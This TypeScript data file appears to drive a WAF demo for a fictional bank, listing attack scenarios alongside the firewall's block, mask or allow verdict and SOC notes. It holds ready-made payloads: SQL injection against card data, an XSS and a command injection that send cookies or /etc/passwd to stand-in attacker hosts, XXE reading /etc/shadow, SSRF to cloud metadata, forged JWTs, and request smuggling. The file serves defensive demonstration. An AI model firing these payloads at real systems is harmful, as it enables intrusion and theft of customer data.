import type { BankingService } from './banking'

export type Verdict = 'block' | 'alarm' | 'mask' | 'allow'
export type Severity = 'critical' | 'high' | 'medium' | 'low' | 'info'

export interface AttackScenario {
  id: string
  name: string
  category: string
  severity: Severity
  service: BankingService
  method: string
  path: string
  description: string
  businessImpact: string
  payload?: string
  headers?: Record<string, string>
  feature: string
  verdict: Verdict
  violation: string
  signatureId?: string
  owasp?: string
  mitre?: string
  detail: string
  socNotes: string
  maskedResponse?: string
  allowResponse?: string
  policyHint?: string
}

export const attacks: AttackScenario[] = [
  {
    id: 'sqli-account',
    name: 'SQLi on account lookup',
    category: 'Injection',
    severity: 'critical',
    service: 'internet-banking',
    method: 'GET',
    path: "/api/v2/accounts?iban=GB82WEST12345698765432' UNION SELECT pan,cvv FROM cards--",
    description:
      'Union-based SQL injection attempting to exfiltrate card PANs from the retail banking API.',
    businessImpact: 'Full cardholder data breach · PCI DSS catastrophic event',
    feature: 'Attack Signatures',
    verdict: 'block',
    violation: 'VIOL_ATTACK_SIGNATURE',
    signatureId: '200001475',
    owasp: 'A03: Injection',
    mitre: 'T1190',
    detail:
      'SQL Injection signature matched on parameter iban. Request blocked before reaching rib-web-tier.',
    socNotes:
      'Correlate with credential-stuffing waves from same /16. Open P1 incident if repeats > 50/min.',
    policyHint: 'SQL Injection Signatures · block',
  },
  {
    id: 'xss-memo',
    name: 'XSS in transfer memo',
    category: 'Injection',
    severity: 'high',
    service: 'internet-banking',
    method: 'POST',
    path: '/api/v2/transfers',
    payload:
      '{"from":"GB82WEST12345698765432","to":"GB29NWBK60161331926819","amount":250.00,"currency":"GBP","memo":"<img src=x onerror=fetch(\'https://evil.example/steal?c=\'+document.cookie)>"}',
    description:
      'Stored XSS in a payment reference designed to hijack relationship-manager sessions when viewing history.',
    businessImpact: 'Session hijack of staff / high-net-worth customers',
    feature: 'Attack Signatures',
    verdict: 'block',
    violation: 'VIOL_ATTACK_SIGNATURE',
    signatureId: '200000098',
    owasp: 'A03: Injection',
    detail:
      'XSS signature matched in JSON field memo. Content profile + signature engine cooperated.',
    socNotes: 'Common precursor to authorised-push-payment (APP) fraud coaching.',
    policyHint: 'XSS Signatures · JSON profile',
  },
  {
    id: 'cmdi-export',
    name: 'Command injection in statement export',
    category: 'Injection',
    severity: 'critical',
    service: 'internet-banking',
    method: 'POST',
    path: '/api/v2/statements/export',
    payload:
      '{"accountId":"acc_98421","format":"pdf; curl http://attacker.example/exfil?d=$(cat /etc/passwd | base64)","from":"2025-01-01","to":"2025-12-31"}',
    description:
      'OS command injection via the statement export format parameter on the document worker.',
    businessImpact: 'Host compromise in PCI segment · lateral movement risk',
    feature: 'Attack Signatures',
    verdict: 'block',
    violation: 'VIOL_ATTACK_SIGNATURE',
    signatureId: '200003833',
    owasp: 'A03: Injection',
    detail: 'Command execution signature matched on format parameter.',
    socNotes: 'Escalate to platform SRE — document workers must stay non-interactive.',
  },
  {
    id: 'cred-stuff',
    name: 'Credential stuffing on login',
    category: 'Account takeover',
    severity: 'critical',
    service: 'internet-banking',
    method: 'POST',
    path: '/auth/login',
    payload: '{"username":"j.smith@meridian.example","password":"Summer2024!","channel":"web"}',
    headers: {
      'User-Agent': 'python-requests/2.31.0',
      'X-Forwarded-For': '185.220.101.42',
    },
    description:
      'High-velocity login attempts using leaked credential pairs from a commodity botnet.',
    businessImpact: 'Account takeover → APP fraud / wire theft',
    feature: 'Brute Force + Bot Protection',
    verdict: 'block',
    violation: 'VIOL_BRUTE_FORCE',
    owasp: 'A07: Identification Failures',
    detail:
      'Failed-login threshold exceeded for /auth/login; client also classified as malicious automation.',
    socNotes: 'Trigger step-up MFA freeze for targeted usernames appearing in the burst.',
    policyHint: 'brute-force on /auth/login · bot class block',
  },
  {
    id: 'otp-spray',
    name: 'OTP / SCA code spraying',
    category: 'Account takeover',
    severity: 'critical',
    service: 'internet-banking',
    method: 'POST',
    path: '/auth/sca/verify',
    payload: '{"challengeId":"sca_9f2a","otp":"000000"}',
    description:
      'Six-digit OTP spraying against PSD2 Strong Customer Authentication challenge endpoint.',
    businessImpact: 'Bypass of SCA · fraudulent payment authorisation',
    feature: 'Brute Force Prevention',
    verdict: 'block',
    violation: 'VIOL_BRUTE_FORCE',
    owasp: 'A07: Identification Failures',
    detail:
      'SCA verify URL exceeded attempt threshold within the policy window; source temporarily banned.',
    socNotes: 'Align WAF threshold with IAM lockout (usually 5 attempts).',
  },
  {
    id: 'cookie-tamper',
    name: 'Session cookie integrity attack',
    category: 'Session',
    severity: 'high',
    service: 'internet-banking',
    method: 'GET',
    path: '/api/v2/profile',
    headers: {
      Cookie: 'MBSESSION=eyJhbGciOiJub25lIn0.admin.role; MBSESSION=tampered_value_%%00',
    },
    description:
      'Tampered MBSESSION cookie with null-byte and integrity failure after login.',
    businessImpact: 'Privilege escalation / session fixation',
    feature: 'Cookie Enforcement',
    verdict: 'block',
    violation: 'VIOL_COOKIE_MALFORMED',
    detail:
      'Enforced cookie MBSESSION failed integrity check; HttpOnly/Secure/SameSite attributes enforced on responses.',
    socNotes: 'Pair with server-side session binding to device fingerprint.',
  },
  {
    id: 'jwt-none',
    name: 'Open Banking JWT alg=none',
    category: 'API auth',
    severity: 'critical',
    service: 'open-banking',
    method: 'GET',
    path: '/open-banking/v3.1/aisp/accounts',
    headers: {
      Authorization:
        'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0cHAtbWFsd2FyZSIsInNjb3BlIjoiYWNjb3VudHMiLCJpc3MiOiJodHRwczovL2FwaS5tZXJpZGlhbmJhbmsuZXhhbXBsZSJ9.',
      'x-fapi-interaction-id': '00000000-0000-4000-8000-000000000001',
    },
    description:
      'TPP-style request with unsigned JWT (alg=none) attempting to impersonate a licensed AISP.',
    businessImpact: 'Unauthorised account information access (AIS)',
    feature: 'JWT Protection',
    verdict: 'block',
    violation: 'VIOL_JWT',
    owasp: 'API2: Broken Authentication',
    detail: 'JWT header property alg=none rejected by JWT protection policy.',
    socNotes: 'Alert Open Banking programme — may indicate rogue TPP testing.',
  },
  {
    id: 'jwt-priv',
    name: 'JWT claim privilege escalation',
    category: 'API auth',
    severity: 'critical',
    service: 'open-banking',
    method: 'POST',
    path: '/open-banking/v3.1/pisp/domestic-payments',
    headers: {
      Authorization:
        'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0cHAtbGl0ZSIsInJvbGUiOiJhZG1pbiIsInNjb3BlIjoicGF5bWVudHMifQ.invalid',
    },
    payload:
      '{"Data":{"Initiation":{"InstructionIdentification":"instr-1","EndToEndIdentification":"e2e-1","InstructedAmount":{"Amount":"95000.00","Currency":"GBP"},"CreditorAccount":{"SchemeName":"UK.OBIE.SortCodeAccountNumber","Identification":"11223312345678"}}}}',
    description:
      'Manipulated JWT claims elevating a limited TPP to admin with a high-value PIS initiation.',
    businessImpact: 'Fraudulent payment initiation up to £95,000',
    feature: 'JWT Protection + Attack Signatures',
    verdict: 'block',
    violation: 'VIOL_JWT',
    owasp: 'API5: Broken Function Level Auth',
    detail:
      'JWT signature invalid and role claim not in allow-list for PISP client profile.',
    socNotes: 'Cross-check FAPI intent-id binding at the API gateway.',
  },
  {
    id: 'bola-accounts',
    name: 'BOLA / IDOR on customer accounts',
    category: 'AuthZ abuse',
    severity: 'critical',
    service: 'open-banking',
    method: 'GET',
    path: '/open-banking/v3.1/aisp/accounts/acc_OTHER_CUSTOMER_99221/balances',
    headers: {
      Authorization: 'Bearer eyJhbGciOiJSUzI1NiJ9.valid-tpp-token-for-customer-A',
      'x-fapi-interaction-id': '11111111-1111-4111-8111-111111111111',
    },
    description:
      'Broken Object Level Authorisation — TPP token for customer A requesting customer B balances.',
    businessImpact: 'Cross-customer data leakage · regulatory breach',
    feature: 'User-defined URLs + Override Rules',
    verdict: 'block',
    violation: 'VIOL_URL',
    owasp: 'API1: BOLA',
    detail:
      'Positive-security URL/parameter policy rejected accountId outside the consent-bound allow pattern.',
    socNotes:
      'WAF provides defence-in-depth; primary control remains consent service. File under OB security testing.',
    policyHint: 'user-defined URL parameters · explicit accountId pattern',
  },
  {
    id: 'openapi-extra',
    name: 'OpenAPI mass-assignment on payment',
    category: 'API contract',
    severity: 'high',
    service: 'open-banking',
    method: 'POST',
    path: '/open-banking/v3.1/pisp/domestic-payment-consents',
    payload:
      '{"Data":{"Initiation":{"InstructedAmount":{"Amount":"10.00","Currency":"GBP"},"CreditorAccount":{"SchemeName":"UK.OBIE.SortCodeAccountNumber","Identification":"99887711223344"},"Risk":{}}},"status":"Authorised","fraudScoreOverride":0,"skipSca":true}',
    description:
      'Request includes undocumented fields skipSca and fraudScoreOverride — classic mass assignment.',
    businessImpact: 'SCA bypass / fraud engine evasion if app is vulnerable',
    feature: 'API Security (OpenAPI)',
    verdict: 'block',
    violation: 'VIOL_JSON_FORMAT',
    owasp: 'API3: Broken Object Property Auth',
    detail:
      'JSON content profile derived from OpenAPI rejected unknown properties not in the schema.',
    socNotes: 'Keep OpenAPI artefact in CI; regenerate WAF policy on each OB release.',
    policyHint: 'open-api-files · disallow unknown JSON properties',
  },
  {
    id: 'openapi-type',
    name: 'Schema type confusion on amount',
    category: 'API contract',
    severity: 'high',
    service: 'card-payments',
    method: 'POST',
    path: '/v1/authorizations',
    payload:
      '{"merchantId":"mrc_4421","pan":"4111111111111111","expiry":"12/28","cvv":"123","amount":"-500.00","currency":"GBP"}',
    description:
      'Negative amount and stringly-typed abuse against card authorisation schema.',
    businessImpact: 'Refund fraud / ledger imbalance',
    feature: 'API Security (OpenAPI)',
    verdict: 'block',
    violation: 'VIOL_JSON_FORMAT',
    detail:
      'Amount failed minimum exclusive-zero schema constraint from the payments OpenAPI.',
    socNotes: 'Business-logic tests should complement schema enforcement.',
  },
  {
    id: 'xxe-sepa',
    name: 'XXE in SEPA pain.001 upload',
    category: 'Injection',
    severity: 'critical',
    service: 'corporate-wire',
    method: 'POST',
    path: '/corp/v1/sepa/pain001',
    headers: { 'Content-Type': 'application/xml' },
    payload:
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><Document xmlns="urn:iso:std:iso:20022:tech:xsd:pain.001.001.09"><CstmrCdtTrfInitn><GrpHdr><MsgId>&xxe;</MsgId></GrpHdr></CstmrCdtTrfInitn></Document>',
    description:
      'XML External Entity attack embedded in an ISO 20022 customer credit transfer initiation.',
    businessImpact: 'Secrets theft from payments hub · sanctions-file integrity risk',
    feature: 'XML Content Profiles',
    verdict: 'block',
    violation: 'VIOL_XML_FORMAT',
    owasp: 'A05: Security Misconfiguration',
    detail:
      'XML profile disallows external entities / DTD resolution for pain.001 content type.',
    socNotes: 'Corporate channel is high-value — page SOC manager on repeat XXE.',
  },
  {
    id: 'json-bomb',
    name: 'JSON depth bomb on FX quote',
    category: 'DoS',
    severity: 'high',
    service: 'card-payments',
    method: 'POST',
    path: '/v1/fx/quote',
    payload:
      '{"pair":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"nested":{"v":1}}}}}}}}}}}}}',
    description:
      'Deeply nested JSON crafted to exhaust parser resources on the FX quoting service.',
    businessImpact: 'Availability loss for card FX · revenue impact',
    feature: 'JSON Content Profiles',
    verdict: 'block',
    violation: 'VIOL_JSON_FORMAT',
    detail: 'Exceeded maximumStructureDepth (10) on Default JSON profile.',
    socNotes: 'Often paired with L7 DoS — check App Protect DoS dashboard.',
  },
  {
    id: 'graphql-intro',
    name: 'Wealth GraphQL introspection',
    category: 'GraphQL',
    severity: 'medium',
    service: 'wealth-graphql',
    method: 'POST',
    path: '/graphql',
    payload:
      '{"query":"query { __schema { types { name fields { name args { name type { name } } } } } }"}',
    description:
      'Full schema introspection against the private-banking GraphQL endpoint.',
    businessImpact: 'Attack surface mapping of HNW portfolio APIs',
    feature: 'GraphQL Protection',
    verdict: 'block',
    violation: 'VIOL_GRAPHQL_FORMAT',
    detail: 'GraphQL profile disallows introspection in production.',
    socNotes: 'Allow introspection only in lower environments via override rules.',
  },
  {
    id: 'graphql-batch',
    name: 'GraphQL batch balance enumeration',
    category: 'GraphQL',
    severity: 'high',
    service: 'wealth-graphql',
    method: 'POST',
    path: '/graphql',
    payload:
      '[{"query":"query($i:ID!){ account(id:$i){ balance } }","variables":{"i":"1"}},{"query":"query($i:ID!){ account(id:$i){ balance } }","variables":{"i":"2"}},{"query":"query($i:ID!){ account(id:$i){ balance } }","variables":{"i":"3"}}]',
    description:
      'Batched GraphQL queries enumerating account balances to bypass per-request rate limits.',
    businessImpact: 'HNW balance harvesting · privacy incident',
    feature: 'GraphQL Protection',
    verdict: 'block',
    violation: 'VIOL_GRAPHQL_FORMAT',
    owasp: 'API4: Unrestricted Resource Consumption',
    detail:
      'Batch size and query complexity exceeded GraphQL defence attributes.',
    socNotes: 'Disable batching or cap at 1 for wealth tier.',
  },
  {
    id: 'graphql-depth',
    name: 'GraphQL circular depth attack',
    category: 'GraphQL',
    severity: 'high',
    service: 'wealth-graphql',
    method: 'POST',
    path: '/graphql',
    payload:
      '{"query":"query { viewer { portfolios { holdings { instrument { related { portfolios { holdings { instrument { isin } } } } } } } } }"}',
    description:
      'Pathological nested selection set designed to amplify resolver load.',
    businessImpact: 'Wealth API CPU exhaustion',
    feature: 'GraphQL Protection',
    verdict: 'block',
    violation: 'VIOL_GRAPHQL_FORMAT',
    detail: 'Maximum nesting depth violation on GraphQL profile.',
    socNotes: 'Tune depth to match real advisory UI queries (usually ≤ 7).',
  },
  {
    id: 'grpc-malformed',
    name: 'Malformed gRPC mobile frame',
    category: 'Mobile',
    severity: 'high',
    service: 'mobile-bff',
    method: 'POST',
    path: '/meridian.mobile.v1.Banking/GetAccounts',
    headers: {
      'Content-Type': 'application/grpc',
      te: 'trailers',
    },
    payload: '\\x00\\xff\\xffmalformed-protobuf-length-prefix\\\\x00\\\\x00',
    description:
      'Corrupt protobuf length-prefix targeting the mobile GetAccounts RPC.',
    businessImpact: 'Mobile BFF crash / thread pool exhaustion',
    feature: 'gRPC Protection',
    verdict: 'block',
    violation: 'VIOL_GRPC_FORMAT',
    detail:
      'gRPC content profile detected malformed protobuf; IDL-enforced unknown field prohibition active.',
    socNotes: 'Confirm only official apps present valid client certificates at mTLS tier.',
  },
  {
    id: 'dataguard-pan',
    name: 'PAN leakage on payment receipt',
    category: 'Data loss',
    severity: 'critical',
    service: 'card-payments',
    method: 'GET',
    path: '/v1/receipts/rcpt_1042',
    description:
      'Upstream accidentally returns a full Primary Account Number in the receipt JSON.',
    businessImpact: 'PCI DSS store of CHD · potential fine & brand damage',
    feature: 'Data Guard',
    verdict: 'mask',
    violation: 'VIOL_DATA_GUARD',
    detail:
      'Credit card number detected in response body and masked before delivery to client.',
    socNotes: 'Open defect against payments team — WAF is compensating control only.',
    maskedResponse:
      '{"receiptId":"rcpt_1042","card":"4111-****-****-1111","scheme":"VISA","amount":84.20,"currency":"GBP","merchant":"Meridian Pay"}',
    allowResponse:
      '{"receiptId":"rcpt_1042","card":"4111-1111-1111-1111","scheme":"VISA","amount":84.20,"currency":"GBP","merchant":"Meridian Pay"}',
  },
  {
    id: 'dataguard-ssn',
    name: 'National ID in KYC download',
    category: 'Data loss',
    severity: 'high',
    service: 'internet-banking',
    method: 'GET',
    path: '/api/v2/kyc/documents/doc_88/content',
    description:
      'KYC document metadata endpoint echoes a US SSN / national identifier in JSON.',
    businessImpact: 'GDPR special-category adjacent PII exposure',
    feature: 'Data Guard',
    verdict: 'mask',
    violation: 'VIOL_DATA_GUARD',
    detail: 'US SSN pattern matched and masked in response.',
    socNotes: 'Enable custom patterns for NI numbers / tax IDs per jurisdiction.',
    maskedResponse:
      '{"docId":"doc_88","type":"identity","nationalId":"***-**-6789","status":"verified"}',
  },
  {
    id: 'bot-fx',
    name: 'Malicious bot scraping FX rates',
    category: 'Automation',
    severity: 'medium',
    service: 'card-payments',
    method: 'GET',
    path: '/v1/fx/rates?pair=GBPUSD&pages=all',
    headers: {
      'User-Agent': 'scrapy-redis/2.0 (+http://scrapy.org)',
    },
    description:
      'Known scraper UA harvesting FX rates for arbitrage against the retail board.',
    businessImpact: 'Pricing IP leakage · unfair competition',
    feature: 'Bot Protection',
    verdict: 'block',
    violation: 'VIOL_BOT_CLIENT',
    detail: 'Bot class: malicious-bot. Mitigation action: block.',
    socNotes: 'Allowlisted market-data partners use trusted-bot class.',
  },
  {
    id: 'bot-sqlmap',
    name: 'sqlmap probe on transfer API',
    category: 'Automation',
    severity: 'high',
    service: 'internet-banking',
    method: 'GET',
    path: '/api/v2/transfers?id=1',
    headers: {
      'User-Agent': 'sqlmap/1.7.2#stable (http://sqlmap.org)',
    },
    description: 'Automated SQL injection toolkit fingerprint against transfers.',
    businessImpact: 'Active exploitation attempt on payment path',
    feature: 'Bot Protection',
    verdict: 'block',
    violation: 'VIOL_BOT_CLIENT',
    detail: 'Attack-tool User-Agent classified as malicious-bot.',
    socNotes: 'Auto-block source ASN in IP intelligence feed.',
  },
  {
    id: 'geo-sanctions',
    name: 'Access from sanctioned geography',
    category: 'Geo / sanctions',
    severity: 'high',
    service: 'corporate-wire',
    method: 'POST',
    path: '/corp/v1/wires',
    headers: { 'X-Forwarded-For': '175.45.176.1' },
    payload:
      '{"amount":250000,"currency":"USD","beneficiary":"Offshore Holdings Ltd","bic":"XXXXUS33"}',
    description:
      'High-value wire initiation from an IP geolocating to a disallowed country.',
    businessImpact: 'Sanctions / embargo violation exposure',
    feature: 'Geolocation',
    verdict: 'block',
    violation: 'VIOL_GEOLOCATION',
    detail: 'Source geolocation matches disallowed country list in policy.',
    socNotes: 'Feed into sanctions workflow — do not solely rely on WAF geo.',
  },
  {
    id: 'ip-intel',
    name: 'Tor exit / botnet IP intelligence',
    category: 'Geo / sanctions',
    severity: 'high',
    service: 'internet-banking',
    method: 'GET',
    path: '/api/v2/accounts',
    headers: { 'X-Forwarded-For': '185.220.101.1' },
    description:
      'Anonymous Tor exit node with poor IP reputation accessing retail accounts API.',
    businessImpact: 'Elevated fraud probability on session',
    feature: 'IP Intelligence',
    verdict: 'block',
    violation: 'VIOL_MALICIOUS_IP',
    detail:
      'IP Intelligence category (anonymizer / tor) enforced as block for RIB.',
    socNotes: 'Corporate VPN egress allowlisted via IP address lists.',
  },
  {
    id: 'threat-campaign',
    name: 'Banking trojan campaign probe',
    category: 'Threat intel',
    severity: 'critical',
    service: 'internet-banking',
    method: 'GET',
    path: '/online/scripts/webinject/config.bin',
    description:
      'URL pattern matching an active F5 Threat Labs campaign for banking webinject droppers.',
    businessImpact: 'Malware staging against retail customers',
    feature: 'Threat Campaigns',
    verdict: 'block',
    violation: 'VIOL_THREAT_CAMPAIGN',
    detail:
      'Threat campaign signature hit with high confidence / near-zero false-positive rate.',
    socNotes: 'Share IoC with fraud team and endpoint detection partners.',
  },
  {
    id: 'traversal-statements',
    name: 'Path traversal to statement store',
    category: 'Evasion',
    severity: 'high',
    service: 'internet-banking',
    method: 'GET',
    path: '/static/statements/..%2f..%2f..%2fvar/statements/acc_OTHER.pdf',
    description:
      'Encoded directory traversal toward another customer’s PDF statement.',
    businessImpact: 'Cross-customer document disclosure',
    feature: 'Evasion Techniques',
    verdict: 'block',
    violation: 'VIOL_EVASION',
    detail: 'Directory traversal evasion detected after URI normalisation.',
    socNotes: 'Statements should never be on a static file server — defence in depth.',
  },
  {
    id: 'filetype-dump',
    name: 'Database dump filetype probe',
    category: 'Surface',
    severity: 'high',
    service: 'internet-banking',
    method: 'GET',
    path: '/backup/meridian_core_2026.sql',
    description: 'Attempt to download a disallowed .sql database dump from web root.',
    businessImpact: 'Entire core-banking extract exposure',
    feature: 'Disallowed File Types',
    verdict: 'block',
    violation: 'VIOL_FILETYPE',
    detail: 'Extension .sql is on the disallowed filetype list.',
    socNotes: 'Hunt for accidental publish of backups in object storage too.',
  },
  {
    id: 'method-trace',
    name: 'TRACE method on auth realm',
    category: 'Surface',
    severity: 'medium',
    service: 'internet-banking',
    method: 'TRACE',
    path: '/auth/login',
    description: 'HTTP TRACE used for cross-site tracing against the login realm.',
    businessImpact: 'Credential leakage via intermediate caches',
    feature: 'Allowed Methods',
    verdict: 'block',
    violation: 'VIOL_METHOD',
    detail: 'HTTP method TRACE is not in the allowed methods list.',
    socNotes: 'Only GET/POST/PUT/PATCH/DELETE allowed on RIB.',
  },
  {
    id: 'http-smuggle',
    name: 'HTTP request smuggling probe',
    category: 'Evasion',
    severity: 'critical',
    service: 'open-banking',
    method: 'POST',
    path: '/open-banking/v3.1/aisp/accounts',
    headers: {
      'Content-Length': '6',
      'Transfer-Encoding': 'chunked',
    },
    payload: '0\r\n\r\nG',
    description:
      'Ambiguous Content-Length / Transfer-Encoding pair — classic desync probe.',
    businessImpact: 'Cache poison / credential hijack across TPP traffic',
    feature: 'HTTP Compliance',
    verdict: 'block',
    violation: 'VIOL_HTTP_PROTOCOL',
    detail: 'HTTP protocol compliance violation — conflicting length headers.',
    socNotes: 'Validate NGINX HTTP/2 fronting to avoid classic H1 desync.',
  },
  {
    id: 'ssrf-webhook',
    name: 'SSRF via payment webhook URL',
    category: 'SSRF',
    severity: 'critical',
    service: 'card-payments',
    method: 'POST',
    path: '/v1/merchants/mrc_4421/webhooks',
    payload:
      '{"event":"payment.captured","url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
    description:
      'Server-side request forgery aiming at cloud metadata from webhook dispatcher.',
    businessImpact: 'Cloud credential theft · PCI segment breach',
    feature: 'Attack Signatures + User-defined Parameters',
    verdict: 'block',
    violation: 'VIOL_ATTACK_SIGNATURE',
    signatureId: '20000400x',
    owasp: 'A10: SSRF',
    detail:
      'Link-local / metadata URL patterns blocked by signature and parameter allow-list (https egress only).',
    socNotes: 'Webhook worker must also enforce egress allow-list natively.',
  },
  {
    id: 'business-neg',
    name: 'Negative wire amount logic abuse',
    category: 'Business logic',
    severity: 'high',
    service: 'corporate-wire',
    method: 'POST',
    path: '/corp/v1/wires',
    payload:
      '{"amount":-150000.00,"currency":"EUR","debtorAccount":"DE89370400440532013000","creditorAccount":"FR1420041010050500013M02606","purpose":"rebate"}',
    description:
      'Negative amount attempting to invert a credit transfer into an unauthorised pull.',
    businessImpact: 'Ledger manipulation / fraud',
    feature: 'API Security (OpenAPI)',
    verdict: 'block',
    violation: 'VIOL_JSON_FORMAT',
    detail: 'OpenAPI exclusiveMinimum on amount rejected the payload.',
    socNotes: 'Complement with dual-control in payments hub for > €50k.',
  },
  {
    id: 'enum-forgot',
    name: 'Account enumeration via forgot-password',
    category: 'Account takeover',
    severity: 'medium',
    service: 'internet-banking',
    method: 'POST',
    path: '/auth/forgot-password',
    payload: '{"username":"ceo@meridian.example"}',
    headers: { 'User-Agent': ' enumeration-kit/3.2' },
    description:
      'Usernames sprayed against forgot-password with timing/bot patterns.',
    businessImpact: 'Target list for spear-phishing executives',
    feature: 'Bot Protection + Brute Force',
    verdict: 'block',
    violation: 'VIOL_BOT_CLIENT',
    detail: 'Automation class blocked; uniform responses still recommended app-side.',
    socNotes: 'Ensure app returns identical messages for known/unknown users.',
  },
  {
    id: 'l7dos-login',
    name: 'L7 slowloris on login',
    category: 'DoS',
    severity: 'high',
    service: 'internet-banking',
    method: 'POST',
    path: '/auth/login',
    headers: {
      'Content-Type': 'application/json',
      'User-Agent': 'slowloris-sim/1.0',
    },
    payload: '{"username":"stress","password":"x"',
    description:
      'Incomplete/slow body pattern simulating Layer 7 stress against authentication.',
    businessImpact: 'Retail login outage during peak (salary day)',
    feature: 'Layer 7 DoS',
    verdict: 'block',
    violation: 'VIOL_DOS_ATTACK',
    detail:
      'App Protect DoS behavioural engine flagged bad actor / stress on protected object /auth/login.',
    socNotes: 'Check DoS dashboard protected-object latency and mitigated RPS.',
  },
  {
    id: 'header-crlf',
    name: 'CRLF injection on redirect',
    category: 'Evasion',
    severity: 'high',
    service: 'internet-banking',
    method: 'GET',
    path: '/auth/callback?next=%0d%0aSet-Cookie:%20MBSESSION=hijacked',
    description:
      'CRLF injection via redirect parameter attempting response splitting.',
    businessImpact: 'Session fixation via injected Set-Cookie',
    feature: 'Evasion Techniques',
    verdict: 'block',
    violation: 'VIOL_EVASION',
    detail: 'Bad escaped characters / response-splitting evasion technique blocked.',
    socNotes: 'Also enforce server-side allow-list of redirect targets.',
  },
  {
    id: 'clean-ob-ais',
    name: 'Legitimate Open Banking AIS',
    category: 'Allow',
    severity: 'info',
    service: 'open-banking',
    method: 'GET',
    path: '/open-banking/v3.1/aisp/accounts',
    headers: {
      Authorization: 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.valid-tpp',
      'x-fapi-interaction-id': 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee',
      'User-Agent': 'TPP-Connector/4.2 (licensed)',
    },
    description:
      'Healthy AISP account request from a licensed TPP with valid FAPI interaction id.',
    businessImpact: 'Normal Open Banking traffic — must pass',
    feature: 'Baseline Policy',
    verdict: 'allow',
    violation: 'N/A',
    detail: 'No violations. Request forwarded to ob-api-gateway.',
    socNotes: 'Use as regression case when promoting policies transparent → blocking.',
    allowResponse:
      '{"Data":{"Account":[{"AccountId":"acc_1001","Currency":"GBP","AccountType":"Personal"}]},"Links":{"Self":"/open-banking/v3.1/aisp/accounts"}}',
  },
  {
    id: 'clean-transfer',
    name: 'Legitimate SCA-approved transfer',
    category: 'Allow',
    severity: 'info',
    service: 'internet-banking',
    method: 'POST',
    path: '/api/v2/transfers',
    headers: {
      Authorization: 'Bearer app-session-token',
      'X-SCA-Token': 'sca_ok_9f3a',
      'User-Agent': 'Mozilla/5.0 (MeridianBank/iOS)',
    },
    payload:
      '{"from":"GB82WEST12345698765432","to":"GB29NWBK60161331926819","amount":250.00,"currency":"GBP","memo":"Rent March"}',
    description: 'Customer transfer after successful PSD2 SCA — expected allow path.',
    businessImpact: 'Core customer journey',
    feature: 'Baseline Policy',
    verdict: 'allow',
    violation: 'N/A',
    detail: 'No violations. Proxied to rib-web-tier with SCA token intact.',
    socNotes: 'Synthetic monitor should hit this path continuously.',
    allowResponse:
      '{"transferId":"trn_7781","status":"AcceptedSettlementInProcess","amount":250.00,"currency":"GBP"}',
  },
]

export function simulateLatency(ms = 420): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

export const categories = [...new Set(attacks.map((a) => a.category))].sort()
export const severities: Severity[] = [
  'critical',
  'high',
  'medium',
  'low',
  'info',
]
